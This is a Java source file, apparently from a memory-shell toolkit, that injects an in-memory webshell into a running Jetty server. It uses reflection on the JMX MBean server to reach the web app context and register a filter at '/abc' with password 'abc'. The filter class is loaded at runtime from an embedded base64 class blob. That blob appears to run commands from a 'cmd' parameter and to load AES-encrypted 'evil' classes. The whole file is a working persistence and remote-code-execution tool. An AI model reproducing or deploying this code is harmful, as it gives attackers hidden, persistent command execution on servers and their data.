package com.memshell.jetty;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import sun.misc.BASE64Decoder;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.EnumSet;
import java.util.Set;


public class FilterBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        // 不管是这种方式拿到的 webAppContext 还是是通过 req.getServletContext() 拿到的 webAppContext
        // 他们的类加载器都是 startJarLoader，不同于 Thread.currentThread().getContextClassLoader()
        // 导致只能通过反射的方式完成整个步骤，否则就会抛 ClassNotFoundException 异常

        try{
            String filterName = "myFilter";
            String urlPattern = "/abc";
            final String password = "abc";

            JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();

            Field field = mBeanServer.getClass().getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mBeanServer);

            field = obj.getClass().getDeclaredField("repository");
            field.setAccessible(true);
            Field modifier = field.getClass().getDeclaredField("modifiers");
            modifier.setAccessible(true);
            modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
            Repository repository = (Repository)field.get(obj);

            Set<NamedObject> namedObjectSet = repository.query(new ObjectName("org.eclipse.jetty.webapp:type=webappcontext,*"), null);
            for(NamedObject namedObject : namedObjectSet){
                field = namedObject.getObject().getClass().getSuperclass().getSuperclass().getDeclaredField("_managed");
                field.setAccessible(true);
                modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                Object webAppContext = field.get(namedObject.getObject());

                field = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                field.setAccessible(true);
                Object handler = field.get(webAppContext);

                field = handler.getClass().getDeclaredField("_filters");
                field.setAccessible(true);
                Object[] objects = (Object[]) field.get(handler);

                boolean flag = false;
                for(Object o : objects){
                    field = o.getClass().getSuperclass().getDeclaredField("_name");
                    field.setAccessible(true);
                    String name = (String)field.get(o);
                    if(name.equals(filterName)){
                        flag = true;
                        break;
                    }
                }

                if(!flag){
                    System.out.println("[+] Add Dynamic Filter");

                    ClassLoader classLoader = handler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        modifier.setInt(field, field.getModifiers() & ~Modifier.FINAL);
                        Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(handler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = handler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(handler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }

                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);


                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
                    Class clazz;
                    try{
                        clazz = cl.loadClass("com.memshell.generic.DynamicFilterTemplate");
                    }catch(ClassNotFoundException e){
                        BASE64Decoder base64Decoder = new BASE64Decoder();
                        String codeClass = "yv66vgAAADMBSwoACgCZCQBTAJoKAJsAnAoAmwCdCACeCgBLAJ8JAFMAoAcAoQoACgCiBwCjCACkBwClBwBlCQCmAKcKAAwAqAcAqQoADACqCACrBwCsCgATAJkKABMArQoArgCvCgCmALAKAK4AsQcAsgoAGQCzBwC0CgAbALMHALUKAB0AswkAtgC3CAC4CgC5ALoIAJMLAE4AuwgAvAoAvQC+CgC9AL8HAMAKAMEAwgoAwQDDCgDEAMUKACcAxggAxwoAJwDICgAnAMkLAE8AygoAywC6CADMBwDNCgAyAJkIAM4KADIAzwoA0ADRCgAyANIKADIA0wgA1AoAvQDVCgC9ANYHANcLADwA2AgA2QsA2gDbCgDLANwIAN0KAN4A3wcA4AsA2gDhCgC9AOIKAEMA4woA3gDkCwBOAOUKAOYA5woA3gDoBwDpCgAMAOoIAOsHAOwHAO0HAO4KAFAAswsA7wDwBwDxBwDyAQAIcGFzc3dvcmQBABJMamF2YS9sYW5nL1N0cmluZzsBABJteUNsYXNzTG9hZGVyQ2xhenoBABFMamF2YS9sYW5nL0NsYXNzOwEABjxpbml0PgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAJleAEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEABWNsYXp6AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAARjb2RlAQAFYnl0ZXMBAAJbQgEAAWUBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQALY2xhc3NMb2FkZXIBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAIkxqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAC1MamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbjsBAAR0aGlzAQAsTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZTsBAA1TdGFja01hcFRhYmxlBwDxBwDzBwDpBwChBwClBwD0BwCpBwCyBwC0BwC1AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcA9QEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABnJlc3VsdAEAA2NtZAEAA2tleQEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQAEdHlwZQcA7gEAB2Rlc3Ryb3kBAAMoKVYBAApTb3VyY2VGaWxlAQAaRHluYW1pY0ZpbHRlclRlbXBsYXRlLmphdmEMAFkAlgwAVQBWBwD2DAD3APgMAPkA+gEAImNvbS5tZW1zaGVsbC5nZW5lcmljLk15Q2xhc3NMb2FkZXIMAPsA/AwAVwBYAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MAP0A/gEAEGphdmEvbGFuZy9PYmplY3QBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcA/wwBAABYDAEBAQIBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uDAEDAP4BAxB5djY2dmdBQUFETUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDUk1ZMjl0TDIxbGJYTm9aV3hzTDJkbGJtVnlhV012VFhsRGJHRnpjMHh2WVdSbGNqc0JBQUZqQVFBWFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUF0a1pXWnBibVZEYkdGemN3RUFMQ2hiUWt4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFGWW5sMFpYTUJBQUpiUWdFQUMyTnNZWE56VEc5aFpHVnlBUUFLVTI5MWNtTmxSbWxzWlFFQUVrMTVRMnhoYzNOTWIyRmtaWEl1YW1GMllRd0FCZ0FIQVFBaVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2d3QUR3QWFBUUFWYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeUFRQVhLRnRDU1VrcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQUlRQUNBQVVBQUFBQUFBSUFBQUFHQUFjQUFRQUlBQUFBT2dBQ0FBSUFBQUFHS2l1M0FBR3hBQUFBQWdBSkFBQUFCZ0FCQUFBQUJBQUtBQUFBRmdBQ0FBQUFCZ0FMQUF3QUFBQUFBQVlBRFFBT0FBRUFDUUFQQUJBQUFRQUlBQUFBUkFBRUFBSUFBQUFRdXdBQ1dTdTNBQU1xQXlxK3RnQUVzQUFBQUFJQUNRQUFBQVlBQVFBQUFBZ0FDZ0FBQUJZQUFnQUFBQkFBRVFBU0FBQUFBQUFRQUJNQURnQUJBQUVBRkFBQUFBSUFGUT09AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwBBAEFBwD0DAEGAQcMAQgBCQwBCgELAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24MAQwAlgEAE2phdmEvaW8vSU9FeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uBwENDAEOAQ8BAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcBEAwBEQBaDAESARMBAAViYXNpYwcA8wwA6wEUDAEVARYBABFqYXZhL3V0aWwvU2Nhbm5lcgcBFwwBGAEZDAEaARsHARwMAR0BHgwAWQEfAQACXEEMASABIQwBIgEjDAEkASUHASYBAAhiZWhpbmRlcgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAADAEnASgHASkMASoBKwwBJwEsDAEtASMBAAEtDAEuAS8MATABMQEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMATIBMwEAAXUHATQMATUBNgwBNwBaAQADQUVTBwE4DAE5AToBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAE7ATwMAT0BPgwAWQE/DAB6AUAMAUEBQgcBQwwBRAEjDAFFAUYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIMAUcBSAEABmVxdWFscwEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAE2phdmEvbGFuZy9FeGNlcHRpb24HAUkMAIABSgEAKmNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZQEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAQamF2YS9sYW5nL1N0cmluZwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADWdldFN1cGVyY2xhc3MBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5qYXZhL3V0aWwvVVVJRAEACnJhbmRvbVVVSUQBABIoKUxqYXZhL3V0aWwvVVVJRDsBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAFcHJpbnQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAHZG9GaW5hbAEABihbQilbQgEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAFMACgABAFQAAgACAFUAVgAAAAIAVwBYAAAABAABAFkAWgABAFsAAAIpAAcACAAAALcqtwABKiu1AAK4AAO2AARNKiwSBbYABrUAB6cAhE4stgAJOgQBOgUZBccANxkEEgqlADAZBBILBr0ADFkDEg1TWQSyAA5TWQWyAA5TtgAPOgWn/9Y6BhkEtgAROgSn/8oSEjoGuwATWbcAFBkGtgAVOgcZBQS2ABYqGQUsBr0AClkDGQdTWQQDuAAXU1kFGQe+uAAXU7YAGMAADLUAB6cAGE0stgAapwAQTSy2ABynAAhNLLYAHrEABQAQABoAHQAIADMAUQBUABAACQCeAKEAGQAJAJ4AqQAbAAkAngCxAB0AAwBcAAAAcgAcAAAAFAAEABUACQAYABAAGgAaACoAHQAbAB4AHAAkAB0AJwAeADMAIABRACMAVAAhAFYAIgBdACMAYAAmAGQAJwByACgAeAApAJ4AMQChACsAogAsAKYAMQCpAC0AqgAuAK4AMQCxAC8AsgAwALYAMgBdAAAAegAMAFYABwBeAF8ABgAkAHoAYABYAAQAJwB3AGEAYgAFAGQAOgBjAFYABgByACwAZABlAAcAHgCAAGYAZwADABAAjgBoAGkAAgCiAAQAZgBqAAIAqgAEAGYAawACALIABABmAGwAAgAAALcAbQBuAAAAAAC3AFUAVgABAG8AAABAAAn/AB0AAwcAcAcAcQcAcgABBwBz/gAJBwBzBwB0BwB1bAcAdgv/AD0AAgcAcAcAcQAAQgcAd0cHAHhHBwB5BAABAHoAewACAFsAAAA1AAAAAgAAAAGxAAAAAgBcAAAABgABAAAANwBdAAAAFgACAAAAAQBtAG4AAAAAAAEAfAB9AAEAfgAAAAQAAQB/AAEAgACBAAIAWwAAAsoABwAKAAABkLIAHxIgtgAhKxIiuQAjAgA6BBkExgBQGQQSJLYAJZkARisqtAACuQAjAgA6BRkFxgAyGQW2ACaaACq7ACdZuAAoGQW2ACm2ACq3ACsSLLYALbYALjoGLLkALwEAGQa2ADCnAS4ZBMYBIRkEEjG2ACWZARcrKrQAArkAIwIAxgBEuwAyWbcAMxI0tgA1uAA2tgA3tgA4EjkSNLYAOhAQtgA7OgUrwAA8uQA9AQASPhkFuQA/AwAsuQAvAQAZBbYAQLESQbgAQjoFGQUFuwBDWbsAMlm3ADMrwAA8uQA9AQASPrkARAIAtgA3EjS2ADW2ADi2AEUSQbcARrYARxkFuwATWbcAFCu5AEgBALYASbYAFbYASjoGKrQABxILBb0ADFkDEg1TWQQSS1O2AA8BBb0AClkDGQZTWQS4AAO2AARTtgAYwAAMOgcZB7YATDoIGQcSTQW9AAxZAxJOU1kEEk9TtgAPOgkZCRkIBb0AClkDK1NZBCxTtgAYV6cAFToFGQW2AFGnAAstKyy5AFIDALEAAgBzAMABfQBQAMEBegF9AFAAAwBcAAAAagAaAAAAOwAIAD0AEgA+ACEAPwAtAEAAOgBBAFYAQgBhAEQAcwBGAIAARwCjAEgAtQBJAMAASgDBAE0AyABOAPwATwEWAFABSABRAU8AUgFmAFMBegBWAX0AVAF/AFUBhABWAYcAWAGPAFoAXQAAAI4ADgBWAAsAggBWAAYALQA0AIMAVgAFAKMAHgCEAFYABQDIALIAhQCGAAUBFgBkAIcAZQAGAUgAMgCIAFgABwFPACsAiQCKAAgBZgAUAIsAYgAJAX8ABQBmAIwABQAAAZAAbQBuAAAAAAGQAI0AjgABAAABkACPAJAAAgAAAZAAkQCSAAMAEgF+AJMAVgAEAG8AAAAUAAb8AGEHAHEC+wBc9wC7BwCUCQcAfgAAAAYAAgAbAH8AAQCVAJYAAQBbAAAAKwAAAAEAAAABsQAAAAIAXAAAAAYAAQAAAF8AXQAAAAwAAQAAAAEAbQBuAAAAAQCXAAAAAgCY";
                        byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                        Method method = null;
                        Class clz = cl.getClass();
                        while(method == null && clz != Object.class ){
                            try{
                                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                            }catch(NoSuchMethodException ex){
                                clz = clz.getSuperclass();
                            }
                        }
                        method.setAccessible(true);
                        clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);
                    }

                    holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, clazz.getDeclaredConstructor(String.class).newInstance(password));
                    handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);

                    clazz = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                    Object filterMapping = clazz.newInstance();
                    Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));

                    // prependFilterMapping 会自动把 filter 加到最前面
                    handler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(handler, filterMapping);
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}
